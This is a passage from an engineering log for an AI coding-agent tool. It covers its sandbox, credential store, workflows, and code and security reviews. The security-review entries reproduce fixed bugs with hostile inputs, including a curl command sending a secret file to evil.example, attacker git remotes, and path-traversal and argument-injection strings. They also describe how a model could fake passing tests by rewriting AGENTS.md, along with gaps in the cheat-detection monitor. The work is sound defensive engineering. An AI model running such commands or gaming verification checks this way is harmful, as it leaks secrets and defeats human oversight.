# Project log

The full engineering history of ClutchCode, newest entry last. Split out of
`HANDOFF.md` once it passed 1,200 lines: `HANDOFF.md` answers *"where does the
project stand right now and what is next"* and is read at the start of every
session, so it has to stay short. This file is the archive behind it — read it
when you need the reasoning behind a past decision, not as part of routine
session start-up.

Each entry records what was built, **what was verified and how**, and what was
deliberately deferred. That "and how" is the point: a claim here should be
traceable to a test, a reproduction, or an explicit unverified flag.

---

## What's done

### Phase 1 — minimal agent (baseline)
Single agent, OpenAI-compatible + Anthropic + Ollama providers,
`RunState` machine, native tools (fs/shell/search/tests), SEARCH/REPLACE
edit cascade with fallback, git worktree isolation, deterministic
build/test verification, terminal CLI, the Agent API in-process boundary,
the runtime-replay test harness + `FakeProvider` + redaction canary.

### Phase 2 items landed early
- **Capability probe, context budgeter, edit-format selector** (§4.9,
  §4.5, §4.4) — the adaptation layer's "crown jewel." Standalone tested
  package, wired into the live `AgentLoop`: a run picks up a probed
  model's profile automatically, system-prompt edit-format guidance
  follows `select_edit_format`, `maxOutputTokens` follows the
  reserved-output budget, conversation history compacts (turn-safe) once
  the effective-context budget is exceeded. **Not yet enforced:**
  dedicated repo-map/open-file-window budgets (§9, §4.5) — that subsystem
  doesn't exist before Phase 7, so its share is folded into the live
  history budget for now.
- **`agent resume` hardened** (§6.2, §6.3, §18.2) — a paused run persists
  its full redacted conversation transcript; `resume --extend-steps N`
  (also `--extend-wallclock-ms`/`--extend-tokens`/`--extend-cost-usd`)
  reconstructs the loop from that transcript and actually continues it,
  not just re-attaches and reports status.
- **OS keychain credential storage** (§5.1 tier 1) — see "OS keychain"
  below.

### Phase 5 — git edge cases (§13.4/§13.5)
Submodule writes ask for explicit approval instead of silently landing in
the run's commits; LFS-tracked writes/edits are flagged (`lfsTracked`);
`read_file` recognizes LFS pointer stubs and refuses real binary content;
`agent run --scope path/` pins verification to a monorepo subdir; `agent
checkpoints`/`agent rollback` expose checkpoint history at the CLI; `agent
pr` pushes a run's branch and opens a PR via `gh` (falling back to a real
GitHub compare URL, or just confirming the push). A real bug got fixed
along the way: `approve --squash`'s final commit was bypassing the user's
pre-commit hooks the same way internal checkpoints correctly do — fixed,
tested with both a rejecting and a passing hook script.
**Deliberately not attempted:** a full non-git (snapshot-backed)
`AgentLoop` execution path — `agent run` now fails with a clear "run git
init" error instead of a confusing git error three calls deep, but a
parallel non-git path is a distinctly larger, separate project.

### Phase 3 — OS sandbox Tier 1 (§12.5/§12.6)
`shell` runs under real OS confinement by default when available.
**Linux: runtime-verified.** `bubblewrap` was installed into this
environment specifically to make this real — a test suite writes a file
outside the workspace and asserts a sandboxed `cat` of it fails, asserts a
network fetch inside the sandbox is unreachable, asserts the real CLI
binary's own `npm test` run still passes confined. **macOS (Seatbelt/
`sandbox-exec`): written, not runtime-verified** — authored against the
documented SBPL grammar, structurally tested (balanced parens, expected
clauses), but has never run against a real `sandbox-exec` — no macOS host
exists in this environment. `agent.toml`'s `policy.sandboxTier = "tier0"`
is the documented escape hatch; `agent doctor` reports the active backend.
**Seccomp hardening (§12.6) is now layered under bwrap on x86_64 Linux:**
a classic-BPF filter, hand-assembled in TypeScript (zero new runtime
dependency), denies ~22 syscalls a dev workflow never needs but that are
sandbox-escape/privilege-escalation primitives (`ptrace`, `mount`, `bpf`,
`unshare`, `kexec_load`, kernel module load/unload, etc.) — proven
end-to-end against the real kernel: a real bwrap-sandboxed process
invokes each by number and gets EPERM, a control run without the filter
proves the same syscall succeeds unfiltered. **Landlock is explicitly
not attempted** — a wrong Landlock rule fails by silently granting *more*
access, a worse mistake category than seccomp's fail-loud one, with no
vetted library and no safe way to verify a hand-rolled one here.
**arm64 seccomp isn't supported either** — different syscall numbers, no
arm64 host to verify them against, reported honestly rather than guessed.
**Not yet layered in:** Landlock itself, a Windows Tier 1 backend (WSL2
is the spec's own recommended path there).

### Phase 4 — VS Code extension (§18.1/§18.5)
New `@clutchcode/agent-rpc` package: the Agent API's second binding
(alongside in-process) — LSP-style framed JSON-RPC 2.0 over stdio,
`run/status/listRuns/diff/approve/reject/resume/inspect/checkpoints/
rollback/pr` mapped onto a real `Agent`, runtime events forwarded as
`clutchcode/event` notifications. `clutchcode serve` runs it over real
stdio. `apps/vscode` is a thin client: `runTask.ts`/`connection.ts`/
`presentation.ts` hold all orchestration with zero `vscode` import, proven
by real tests (a real `Agent` behind a real `AgentRpcClient` over
`PassThrough` streams; a separate test spawns the actual compiled
`clutchcode serve` binary as a child process). **`extension.ts`
(the `vscode`-API glue) type-checks against `@types/vscode` but has never
run in a real VS Code extension host** — flagged in a header comment and
in `apps/vscode/README.md`. **Not yet built:** a native two-sided diff
view (currently a single read-only diff-highlighted document), a
run-picker instead of typing a run id, resume/rollback/pr in the
extension UI (the CLI has them; the extension covers §18.5's core
run/diff/approve/reject loop).

### Credential storage — §5.1, all three tiers done
`loadCredentials()` implements the real precedence chain (OS keychain →
encrypted file store → env vars) and backs every real call site
(`Agent.run`, the capability probe, `agent providers`, `agent doctor`).
**Tier 1, OS keychain — Linux: runtime-verified** against a real
freedesktop Secret Service — `secret-tool`/`libsecret`/`gnome-keyring`
were installed into this environment specifically for this; a throwaway
D-Bus session + keyring per test run proves store/get/clear and that a
keychain-stored credential genuinely wins over the same-named env var.
**macOS (`security` CLI) and Windows (DPAPI via PowerShell): written, not
runtime-verified** — same disclosed-gap pattern as Seatbelt, argv/script
shape directly asserted in tests via pure builder functions. **Tier 2,
encrypted file store** (`~/.config/clutchcode/credentials.age`, used only
when tier 1 reports no keychain backend at all — headless Linux, some
Profile-D servers): AES-256-GCM via Node's built-in `crypto`, keyed by a
locally generated, permission-protected "machine key" file plus an
optional passphrase (scrypt). Documented scoping decision: not
byte-compatible `age`-format (that would need a from-scratch
reimplementation of age's wire format to matter) — a real, correct,
dependency-free AEAD doing the same job instead. Needs no OS binary, so
unlike tier 1 it's uniformly verified everywhere: round-trip, wrong
passphrase and tampered-ciphertext failing closed, two different machine
keys never cross-reading each other's values. `agent providers set-key
<anthropic|openai-compatible>` reads the key from stdin (never argv/
history) and routes to whichever tier is actually available; `agent
providers unset-key <provider>` removes it from the same place.

### Project memory correction UX (§10.3) — new @clutchcode/memory package
Toolchain detection now persists as a provenance-timestamped cache
(`{value, derivedAt, source}` per fact), keyed by the repo's *stable*
path — every run used to call `detectToolchain` fresh, so caching at all
is a real behavior change. Invalidated when the manifest files it was
derived from change content; `AGENTS.md` overrides still win on every
re-derive. `agent memory list/show/forget/correct` expose it at the CLI.
**Self-healing (§10.3 point 3):** a real bug got fixed along the way —
`classifyFailure` used to trust `lint`/`typecheck`'s own stage name
unconditionally, so a missing `eslint`/`tsc` binary was misreported as
"there's a lint issue" instead of what it is; new `command-not-found`
classification (exit 127, checked first) fixes this for all four stages,
and `AgentLoop`'s new optional `onVerificationFailure` hook (runtime
stays decoupled from the memory package) lets `agent-api` mark the
matching cached fact stale so the next run re-derives instead of
repeating a proven-wrong command. Proven end-to-end through a real run,
not just at the unit level — including a real bug the test suite itself
caught (see gotchas below). Deliberately out of scope: the "agent
proposes an `AGENTS.md` edit, with consent" flow §10.1 also describes,
and the long-term engineering tier (prior runs/decisions queryable via a
history database) — both real, separate features.

### Workflow Engine (§8.2) — the three Phase 1 built-ins, load-bearing
`RunState.workflowId` existed since early in the project (default:
`"default"`) but nothing ever read it — a stored label with zero effect
on control flow, called out explicitly (and corrected) in an earlier
version of this file's "what's left" table. It's now real: `agent run
--workflow <default|quickfix|review-only>` selects one of three
behaviorally distinct pipelines, implemented as concrete branches in
`AgentLoop` gated on `state.workflowId` (Option B from §8.1's comparison —
additive TS code paths, not a generic stage-pipeline interpreter; that
interpreter plus the JSON-Schema-validated user-declarative layer on top
of it is explicitly deferred, see "what's left"). `default` is byte-for-
byte the pre-existing baseline. `quickfix` forces the §6.7 planning
heuristic off unconditionally — proven by running the *same* ambiguity-
tripping task description through both workflows and asserting `PLANNING`
fires for one, not the other. `review-only` is the interesting one:
`write_file`/`edit_file` are filtered out of a new `effectiveTools` map
that backs *both* the tool schema sent to the model and the dispatch
table `runToolCall` actually executes against, so a model that tries to
edit anyway (tested directly, not just inferred) gets a real
`unknown-tool` error rather than a silent no-op — defense in depth, not
just hiding the schema. It finishes by capturing the model's last reply
into `RunState.summaryCheckpoints` (a field that existed, unused, since
the original RunState design) as the "report" and transitioning straight
to `DONE`, skipping verify/approve/commit — needed one small, narrowly-
justified state-machine addition (`ACTING → DONE`, only reachable from
`finishReviewOnly()`; every other workflow's edges are unchanged).
Unknown `--workflow` values are rejected at the `Agent.run` boundary with
a clear error listing the valid ids, matching the existing "not a git
repo" fail-loud style. 14 new tests across `workflow.test.ts` (registry
shape), `run-state.test.ts` (the new edge + `workflowId` defaulting),
`agent-loop.test.ts` (quickfix vs. default planning contrast, review-only
schema filtering, review-only edit-attempt refusal + report capture), and
`agent.test.ts`/`commands.test.ts` (real end-to-end through the Agent API
and CLI boundaries, plus the unknown-id rejection).

### Code-review pass over this session's own work — three real bugs found and fixed
Ran the `code-review` skill at `high` effort against the full diff since
the seccomp commit (everything built this session: §10.3 memory, §8.2
workflow engine, §18.5 VS Code polish, §8.1 declarative workflows). Three
findings, all verified for real (not taken on faith) before fixing:

1. **`diffFilesAgainstBase` mis-detected a renamed binary file as text.**
   `git diff --numstat -M` combines a rename's two paths into one string
   — confirmed empirically with three throwaway repos: `"old =>
   new"` when the paths share no directory, `"dir/{old => new}"` when
   they do. The original implementation matched a `Set<string>` of
   binary paths (from one bulk `--numstat` query) against the
   individually-parsed `path`/`oldPath` from `--name-status` — never
   matches a combined rename string, so the binary flag silently stayed
   `false` for a renamed binary file with real content changes, and
   `git show`/`fs.readFileSync(...,"utf8")` would have read raw binary
   bytes as text, producing mojibake in the new VS Code diff view. Fixed
   by scoping the numstat binary check to one explicit pathspec per
   file — verified this suppresses the combining entirely (git only
   condenses rename paths when a diff query spans more than the single
   path it's asked about). New test constructs exactly this scenario
   (a binary file, committed, then renamed with a small — not total —
   content change so git's rename-similarity heuristic still detects
   it as a rename) and — checked by literally reverting the fix and
   re-running — fails against the old code, passes against the new.
2. **`classifyFailure`'s `command-not-found` fallback misclassified
   ordinary missing-file errors.** The text-pattern fallback (behind
   exit-code-127, the primary/reliable check) included a bare `"no such
   file or directory"` — precisely the phrase Node's own generic
   `ENOENT` uses for *any* missing file, not just a missing shell
   command. A real test failure like `Error: ENOENT: no such file or
   directory, open '/repo/fixtures/data.json'` (a genuinely fixable bug —
   wrong fixture path) would have been misclassified as
   `command-not-found`: the repair message would tell the model to stop
   calling tools and escalate instead of asking for a targeted fix, and
   `markToolchainFactStale` would incorrectly invalidate a perfectly
   valid cached command. Fixed by only trusting the bare phrase when the
   output *isn't* Node's own `ENOENT`-labeled wording (a shell's own
   exec-failure message for a truly missing command never includes that
   label — only Node's generic file error does). Two new tests: the
   legitimate shell case still classifies as `command-not-found`; the
   Node-ENOENT-for-an-ordinary-file case now doesn't.
3. **`agent memory` commands had no way to see a scoped run's memory at
   all.** `Agent.run --scope path/` (§13.4) caches toolchain memory under
   `<repoPath>/<scope>`, computed once inline in `agent.ts`; `agent
   memory list/show/forget/correct` (§10.3) only ever took a bare
   `repoPath` with no scope parameter and no `--scope` CLI flag —
   structurally incapable of reading or correcting a scoped run's cache,
   not just missing a flag. `agent memory list` after a scoped run
   reported "nothing remembered" even though a fact genuinely was
   cached, and `agent memory correct` for a scoped run silently wrote to
   a different, unused cache file. Fixed by threading `scope` through
   all four `@clutchcode/agent-api` memory functions and adding
   `--scope` to the CLI's `memory`/`list`/`show`/`forget`/`correct`
   subcommands; extracted one shared `resolveMemoryCacheKeyPath(repoPath,
   scope)` helper used by both `memory.ts` and `Agent.run` itself so the
   two computations can't drift apart again the way this bug happened in
   the first place (two separate ad-hoc computations of the same key).
   Four new tests across `agent.test.ts` (scoped vs. unscoped `listMemory`/
   `correctMemoryFact` through the real `Agent` boundary) and
   `commands.test.ts` (the same through the real CLI command functions).

7 new tests total. Full suite after all three fixes: 595/595 passing,
clean `tsc -b`, clean `eslint .`. Nothing here should be read as "the
review found only three things" — it's a single-pass, single-reviewer
review; the honest claim is "these three were confirmed real and fixed,"
not "this code is now bug-free."

### §8.1 user-declarative workflow layer — real JSON-Schema validation via `ajv`
The second authoring layer §8.1 describes, on top of the three built-ins
(previous entry). New `packages/runtime/src/workflow-declaration.ts`:
`{apiVersion: "clutchcode/v1", id, name, stages: [{id, uses, when?,
params?}]}`, `uses` restricted to the five stage kinds `AgentLoop`
actually knows about (`plan`/`implement`/`verify`/`approve`/`commit`).
Chose a real dependency (`ajv`, ~4 small transitive deps, added to
`@clutchcode/runtime`) over hand-rolling a JSON-Schema validator — the
spec explicitly says "JSON-Schema-validated," and a hand-rolled structural
check dressed up as one would be a real gap dressed as done, not what
this project's honesty rule allows. A hit an ajv+TypeScript
`NodeNext`-resolution gotcha along the way: `import Ajv from "ajv"`
type-errors ("not constructable") under this repo's `moduleResolution:
NodeNext`; ajv's package also exports the class by name, so `import {
Ajv } from "ajv"` sidesteps the broken default-export interop path
entirely — preserved as a gotcha below.

Deliberately **not** a general stage-pipeline interpreter — §8.1's own
"no arbitrary control flow" line, taken literally. Structural JSON-Schema
validation is real (via ajv), but a declaration only *resolves* to
something `AgentLoop` can execute if it matches one of exactly two
shapes: a "full" pipeline (`implement` + `verify` required, `plan`
optional with `params.mode: "auto"|"always"`) or a "readonly" one
(`implement` alone, `params.readonly: true`, mirroring `review-only`).
Anything else — verify without implement, two `plan` stages, a readonly
implement combined with other stages — is rejected with a specific error
naming exactly what's unsupported, not silently misinterpreted.

`AgentLoop` was refactored to stop comparing `state.workflowId` against
hardcoded strings and instead consume a resolved `WorkflowPlan`
(`{planMode: "auto"|"always"|"never", readonly: boolean}`) — the built-ins
now resolve to this same shape via `resolveBuiltinWorkflowPlan`, so
`AgentLoop` genuinely never needs to know whether a run is on a built-in
or a custom workflow. Proven directly: a test constructs `AgentLoop` with
a `workflowPlan: {planMode: "always", readonly: false}` and an
unrecognized `workflowId`, and shows planning fires unconditionally even
for a task the §6.7 heuristic would call simple — a real capability none
of the three built-ins express (`default` defers to the heuristic,
`quickfix` always skips).

**A real correctness question this surfaced, and how it's resolved:**
what happens if a paused run's custom workflow *file* is deleted or
changed before `resume()`? Re-reading it at resume time would be wrong —
resumability (§6.2) means the run continues as it started, not as
whatever the file currently says. Fixed by persisting the *resolved*
`WorkflowPlan` on `RunState` itself (`state.workflowPlan`, always set by
`createRunState`, round-trips through JSON exactly like
`budgets`/`consumed` already do) instead of only the workflow id.
`resume()` never touches the filesystem for this. Proven end to end: a
test pauses a run on a custom readonly workflow, deletes the declaration
file, resumes, and confirms the run still finishes via the readonly path
with zero verification — the deleted file genuinely never gets re-read.

`agent run --workflow-file <path.json>` wires it at the CLI;
`--workflow`/`--workflow-file` are mutually exclusive (checked at
`Agent.run`'s boundary, not left to whichever the CLI happened to pass
last). Not built: the dedicated `agent workflow` CLI command (§18.2 marks
that Phase 2) — see "what's left".

19 new tests in `workflow-declaration.test.ts` (schema + semantic
validation, `resolveWorkflowPlan`, real file I/O), 2 new in
`agent-loop.test.ts` (the novel `planMode: "always"` proof + the
unrecognized-id defensive-fallback proof), 2 new in `run-state.test.ts`
(`workflowPlan` resolution + explicit override), 4 new in `agent.test.ts`
(real end-to-end run, invalid-file rejection, mutual-exclusivity
rejection, the delete-then-resume proof), 3 new in `commands.test.ts`.

### VS Code extension polish (§18.5) — native diff, run-picker, resume/rollback/pr
Three items from the extension's original "not yet built" list, all real
and tested at the layer that can be:
1. **Native two-sided diff view.** New `@clutchcode/git` function
   `diffFilesAgainstBase(run, pathScope?)` returns per-file
   `{path, status, before, after, binary}` — real before/after content, not
   unified-diff text — a separate function from `diffAgainstBase` on
   purpose (that one stays a single cheap `git diff` call for callers that
   only ever wanted text, like `agent pr`'s body). It needed two real fixes
   discovered by the tests themselves: `git diff <commit>` never reports an
   untracked path *at all*, no matter what it's diffed against — a
   brand-new file the model just wrote would silently vanish — fixed by
   staging first (`git add -A`, the same thing `checkpoint()` already did
   per step, not a new side effect); and rename detection (`-M`) isn't on
   by default for `git diff` across git versions, so a rename would report
   as an unrelated delete+add without it. Wired through
   `Agent.diffFiles(runId)` and a new `diffFiles` RPC method the same way
   `diff`/`diffStat` already were. `extension.ts` opens one real
   `vscode.diff` editor per changed file (virtual documents served from a
   `TextDocumentContentProvider`, keyed so the file's real extension still
   drives syntax highlighting on both sides), replacing the single
   unified-text document it used to open; binary files are skipped with a
   note instead of shown as mojibake.
2. **A run-picker.** New `pickRun()` in `runTask.ts` fetches the real run
   list over RPC (`listRuns`, already existed, was unused by the
   extension), filters it per command (e.g. only `PAUSED` runs offered to
   `clutchcode.resume`), and hands the picking itself to `ui.pickRun` —
   `extension.ts` implements that with a real `vscode.window.showQuickPick`
   showing status + task per run; tests implement it with a scripted
   choice. Replaces the old free-text "type a run id" input box on every
   command.
3. **resume/rollback/pr commands in the UI.** New `resumeTask`/
   `rollbackTask`/`prTask` orchestration functions, following the same
   split `runClutchCodeTask` already established (no `vscode` import,
   tested against a real `Agent` behind a real `AgentRpcClient`).
   `handlePostRunState` was pulled out of `runClutchCodeTask` so `resumeTask`
   shares the exact same "show diff → ask approve/reject" logic a fresh run
   uses, instead of a second copy of it. `resumeTask` without an explicit
   step extension re-pauses immediately — that's `Agent.resume`'s own
   documented no-op semantics (§6.3), already true of the CLI, not new
   behavior invented here; the extension's resume command prompts for an
   extension amount rather than guessing a default.

`extension.ts` itself remains the one file in this package that's
type-checked-but-not-runtime-verified (no real VS Code extension host in
this environment) — unchanged honesty boundary from Phase 4, just a larger
file behind it now. 10 new/rewritten tests in `runTask.test.ts` (all
against a real `Agent` over real `PassThrough`-piped RPC, including a real
scripted-tool-call edit for the diff-content and rollback tests) plus 5 new
`presentation.test.ts` cases for the two new pure formatters
(`formatDiffTabTitle`, `formatPrResult`), and 7 new `worktree.test.ts`
cases for `diffFilesAgainstBase` itself (added/modified/deleted/renamed/
binary/multi-file/pathScope).

### Docs: "MVP" removed everywhere
The spec used "MVP" to label Phase 1 scope throughout — renamed to
"Phase 1" (or a non-numeric label where it would collide with the
roadmap's own independent Phase 1–11 numbering), because this ships as a
real product built in phases, not a minimum-viable throwaway. Touched
`PROJECT_SPEC.md` (44 occurrences), `README.md`, `docs/PRIOR_ART.md`,
three `research/` notes, and doc comments in five packages. Pure rename,
zero behavior change.

### Full-history security review — six vulnerabilities + two correctness bugs found and fixed, one false positive rejected
Requested as "review everything, security plus like all, till now" — not
scoped to a single diff. Ran the `security-review` skill's own described
methodology (parallel finder subagents fanned out by subsystem — redaction/
transcript persistence, policy/approval engine, git worktree + remote
handling, tool argument construction, sandbox temp-file handling — then a
parallel false-positive-filter subagent per finding, confidence ≥8 kept),
personally orchestrated via the `Agent` tool since the skill's own `git
diff origin/HEAD...` auto-detection had nothing to diff against (everything
prior was already merged). Every finding was independently reproduced in a
real throwaway repo/fixture before being trusted — the session's standing
"verify before fixing" discipline, applied here at larger scale than any
prior round:

1. **§5.2 redaction bypass in `AgentLoop`'s `model.response` event.**
   `state.messages` (and the transcript it feeds) already redacted the
   model's own reply text via `pushMessage`, but the `model.response`
   *runtime event* — a separately persisted artifact, written verbatim to
   `<stateDir>/runs/<runId>/events.jsonl` by `agent-api`'s `appendEvent` —
   used the raw, unredacted `response.text` directly. A model quoting a
   secret it had just read back (e.g. summarizing a `.env` it opened)
   would leak it into that log regardless of the transcript being clean.
   Reproduced with a `FakeProvider` turn that echoes the redaction canary
   in its reply text and asserting the emitted event; the pre-fix version
   fails this assertion (confirmed via `git stash`). Fixed by scrubbing
   `response.text` through the existing `Redactor` before emitting the
   event — `state.messages` still gets the raw text, unchanged. Also
   extended `evals/src/redaction-canary.test.ts`'s full-stack SSE-scripted
   integration test to have the model's own final reply echo the canary
   too, since the original test only injected it via a tool-call argument
   and would never have caught this specific gap.
2. **§12.2 approval-memoization bypass in the shell tool.**
   `PolicyEngine.decide()` memoizes non-destructive `ALLOW` decisions per
   `commandClass` for a run's lifetime (the "approval fatigue" mitigation)
   — `commandClassOf` derived that class as just the first two
   whitespace-split tokens, with no check for shell metacharacters.
   Reproduced for real: approve `"npm test"` once via
   `ctx.policy.remember("npm test", "ALLOW")`, then attempt `"npm test &&
   curl http://evil.example/x --data-binary @secret.txt"` — pre-fix, this
   is silently allowed with no prompt, because both strings share the same
   first two tokens. Fixed by having `commandClassOf` fall back to the
   *full* trimmed command as its own class whenever it contains a shell
   metacharacter (`; & | \` < > \n` or `$(`), tested directly against all
   of those plus a literal newline, so a compound command can never ride
   in on a simple command's remembered approval.
3. **§13.1 `runId` path traversal in `createRunWorktree`.** The `runId`
   is joined straight into `<stateDir>/wt/<runId>` with no validation, and
   it's attacker/model-reachable over the real JSON-RPC `run` method
   (`agent-rpc`'s untrusted-input boundary), not just an internal ID.
   Reproduced by calling `createRunWorktree` directly with `runId:
   "../../../../../../tmp/pwned-worktree"` (confirmed pre-fix it resolves
   clean out of `<stateDir>/wt/` via ordinary `path.join` `..`
   normalization — no error, no containment check) and separately end-to-
   end over the real `agent-rpc` client/server pair. Fixed with a strict
   `^[A-Za-z0-9_-]+$` allow-list on `runId` plus a defense-in-depth
   `path.relative`-based containment check on the resolved path. New tests
   at both the `worktree.ts` unit level (four `runId` values, three
   throwing, one legitimate one not) and the `agent-rpc` integration level
   (the exploit string rejected over the real RPC boundary, target
   directory confirmed never created).
4. **Git-log argument injection → arbitrary file write.** The `git`
   tool's `log` op built its args as `` [`-${args.arg ?? "10"}`,
   "--oneline"] `` — reproduced by constructing a real git repo and
   calling `gitTool.run({ op: "log", arg: "-output=/tmp/x" })`: git parses
   the code's own leading `-` plus the arg's own leading `-` as a `--`
   long option, so this genuinely creates `/tmp/x` via git's `--output`
   flag (first reproduction attempt without the arg's own leading dash
   failed with "unrecognized argument" — the double-dash mechanism only
   triggers when the *arg itself* starts with `-`). Fixed by only ever
   accepting a bare non-negative integer count for `arg` (validated by
   regex) and passing it as `git log -n <count>`, falling back to the
   default `10` for anything else — no string interpolation into a
   dash-prefixed position at all anymore.
5. **Unvalidated git `remote` parameter in `remoteUrl`/`pushBranch`.**
   Any string was accepted as a "remote name" and passed straight to
   `git`, with no check that it's an actual configured remote rather than
   a URL or transport string — a push-destination-redirection/
   exfiltration risk (a value like `https://attacker.example/evil.git` or
   `git@attacker.example:evil/repo.git` would be used as-is). A subagent
   initially flagged this as default-on RCE via `ext::<command>`;
   investigated and downgraded rather than taken at face value —
   `git push -u "ext::sh -c '...'" main"` against a real throwaway repo
   returned `fatal: transport 'ext' not allowed`, because git's actual
   default for `protocol.ext.allow` specifically is `never` (not the
   general `user` default that applies to *other* unlisted protocols, as
   the subagent had claimed). The underlying unvalidated-parameter issue
   is still real and worth closing on its own merits, just correctly
   framed as redirection/exfiltration risk rather than default-on RCE.
   Fixed with a strict `^[A-Za-z0-9_.-]+$` remote-name allow-list,
   rejecting anything that looks like a URL or transport string; tested
   against all three example payloads plus confirming `"origin"` still
   works.
6. **Predictable seccomp filter temp-file path.**
   `ensureSeccompFilterFile` wrote the compiled BPF filter to a fixed,
   predictable filename in the shared system temp directory — a co-
   resident local user could pre-plant a symlink there ahead of the
   write. Fixed by writing into a freshly `fs.mkdtempSync`'d (POSIX-
   guaranteed mode-0700) subdirectory via `O_WRONLY|O_CREAT|O_EXCL`, so
   the write structurally refuses to follow a pre-existing symlink or
   file at the target path — proven both by asserting the new path shape
   (fresh random subdirectory, mode 0700) and by directly exercising the
   `O_EXCL` primitive against a deliberately pre-planted symlink.
7. **Edit-cascade leading-`...` ellipsis-elision bug** (correctness, not
   security, caught along the way). A SEARCH block that opens with its
   own `...` line — eliding everything before the first real anchor —
   was rejected unconditionally, no matter how well the rest matched.
   `applyEllipsisSegments` only ever set `firstMatchIdx` on loop index
   `0`, but a leading ellipsis makes segment `0` the empty elided segment,
   which hits the `seg.length === 0` branch and `continue`s straight past
   that assignment — so `firstMatchIdx` stayed `-1` and the whole edit
   was reported as "SEARCH block did not match" regardless of what
   followed. Fixed by setting `firstMatchIdx` on the first segment that
   actually matches content, not the first segment by index. New test
   uses the same fixture as the existing passing ellipsis test, with the
   SEARCH block starting directly on `...`.
8. **Toolchain-memory `correctToolchainFact` stale-hash bug**
   (correctness, directly violates §10.3 point 4, "human edits win").
   A human correction (`agent memory correct`) reused the cached record's
   existing `manifestHash` verbatim. If that hash was already stale (e.g.
   `package.json` had been edited since the last derive, before the
   correction ran), the very next `getOrDetectToolchain` call would see
   the mismatch, conclude the whole record untrustworthy, and silently
   re-derive from scratch — discarding the human's correction with no
   warning. Reproduced by editing `package.json` between the initial
   derive and the correction, then confirming the correction didn't
   survive the next cache-hit read (pre-fix). Fixed by always stamping
   the *current* manifest hash (recomputed on the spot) whenever a
   correction is written, not just when creating a brand-new record.

608 total tests after all eight fixes (up from 595), clean `tsc -b`,
clean `eslint .`. Six of the eight fixes (everything except the remote-
name validator and the seccomp path fix, whose correctness follows
directly and unambiguously from their own assertions with no ambiguity
to double-check) were verified with the full rigor cycle: `git stash
push -- <file>` to revert just the fix, rerun the new test and confirm
it fails, `git stash pop` to restore it, rerun and confirm it passes.
As with the prior code-review pass: this is a single review round, not
a bug-bounty-grade exhaustive audit — the honest claim is "these eight
were confirmed real (or, for the ninth, confirmed *not* real) and
fixed/corrected," not "this codebase now has zero security issues."

### Round 3 — full-codebase security + correctness review, every package not yet reviewed
Requested as "fix everything and do another round." Fanned out 9 parallel
subagents (`Agent` tool, `general-purpose`, background) across every
package the first two rounds hadn't touched: agent-rpc (the untrusted RPC
boundary), credentials/keychain/config, all tool implementations,
sandbox/policy/redaction, the rest of the git package, the runtime/
workflow engine, provider adapters, the CLI + VS Code extension, and
capability/verification (including cheat-detection — the layer that
exists specifically to catch a model gaming the deterministic gate). One
agent (sandbox/policy) hit a session API limit mid-run and never
completed — genuinely not reviewed this round, listed under "what's
left." The other 8 returned, in total, ~25 candidate findings; 18 were
independently reproduced for real and fixed, each with a new regression
test, 16 of the 18 verified with the full `git stash` revert-and-recheck
cycle (the CLI fixes and the VS Code `package.json` scope fix are the two
whose correctness is unambiguous from their own assertions — spawning the
real compiled binary and reading the raw JSON schema respectively, no
ambiguity to double-check). A handful of git-worktree/dirty-tree
correctness findings were confirmed real but deferred — see "what's
left."

**Most severe, in order:**

1. **§13.1 `runId` path traversal beyond `createRunWorktree`** — round 2
   validated `runId` only at worktree *creation*; three independent
   subagents (credentials, runtime, agent-rpc audits) converged on the
   same finding: every *read/mutate* path — `RunStateStore.load/save/
   delete`, `worktree-store.ts`'s `loadRunWorktree`/`saveRunWorktree`,
   `events.ts`'s `appendEvent`/`readEvents`, and `agent-rpc`'s
   `requireRunId` — built a path from a caller-supplied `runId` with zero
   validation, reachable via `diff`/`approve`/`reject`/`resume`/`inspect`/
   `checkpoints`/`rollback`/`pr`, several of which chain into real,
   destructive `git` operations (`reset --hard`, `clean -fd`, `worktree
   remove --force`) against whatever `worktreePath` a traversed-to file
   happened to name. Fixed by extracting one shared validator
   (`assertSafeRunId`, `@clutchcode/git`'s new `run-id.ts`) and wiring it
   into every one of those choke points, plus the RPC boundary itself as
   defense-in-depth — this is also the concrete story behind the new
   "fix the class, not the instance" convention in `CLAUDE.md`.
2. **Workspace-path symlink escape** — `resolveInWorkspace` (used by
   `read_file`/`write_file`/`edit_file`) decided "inside the workspace"
   by pure string-prefix matching on `path.resolve()` output, never
   resolving a symlink. A symlinked directory inside the workspace
   pointing outside it (checked into a repo, or created via `shell`
   earlier in the same run) made `inside: true` — reproduced for real: a
   `write_file` through such a symlink genuinely wrote outside the
   workspace, with the `PolicyEngine` granting a bare `ALLOW` and no
   approval prompt at all, since the flag it decides on was already
   wrong. Same mechanism gives `read_file` an arbitrary-file-read
   primitive. Fixed by resolving the real path of the deepest *existing*
   ancestor (the leaf usually doesn't exist yet — that's the whole point
   of `write_file`) and checking containment against that.
3. **AGENTS.md override trust boundary (§10.3 point 4)** — `agentsMdContent`
   was read from the *live* worktree, which the model itself is actively
   editing. Reproduced precisely: a scripted model turn writes `AGENTS.md`
   with `test: echo pwned-cheat-passed` plus an unrelated `package.json`
   touch (needed to invalidate `computeManifestHash`'s cache — the exact
   two-file mechanism the review flagged), the run pauses on its step
   budget, and a subsequent `resume()` — which re-derives toolchain
   commands from the now-modified worktree — genuinely ran the fake
   `echo` command instead of the real, failing root test and reached
   `DONE` with the broken build auto-committed (`--yes` mode). This is a
   full bypass of the deterministic verification gate the whole project
   is built around. Fixed by reading `AGENTS.md` from the run's *base
   commit* (`git show <baseCommit>:AGENTS.md`) instead of the live
   worktree — an override only takes effect if it existed before this
   run's own edits, which is what "human-authored" actually means here.
4. **Cheat-detection gaps** (`packages/verification/src/cheat-detection.ts`,
   the layer that exists specifically to catch a model gaming the
   deterministic gate) — four separate, independently-reproduced holes: a
   bare `catch {}` (ES2019+ optional catch binding, no parens) wasn't
   matched by the swallowed-error regex, which required `(...)`; the
   trivial-assertion detector only recognized literal `true`/`1==1`
   shapes, missing e.g. `expect(1).toBe(1)`; `checkHardcodedOutput`'s
   `<=2` added-line threshold counted comment lines, so two harmless
   `// comment` lines padded past a real hardcoded-literal collapse
   undetected; and `checkSnapshotEdit`'s "there's a source rationale"
   exemption fired for *any* other non-test file changed anywhere in the
   diff, not one actually related to the snapshot's subject. Fixed with a
   no-paren regex alternative, a whitespace-tolerant self-equality
   pattern, comment-stripping before the threshold check, and a
   `baseStem`-based subject-relatedness check for the snapshot exemption.
5. **Diff-parser content-loss bug** (`diff-parser.ts`) — the file-header
   skip (`line.startsWith("+++") || line.startsWith("---")`) matched any
   line with that prefix, not just the genuine `+++ b/path`/`--- a/path`
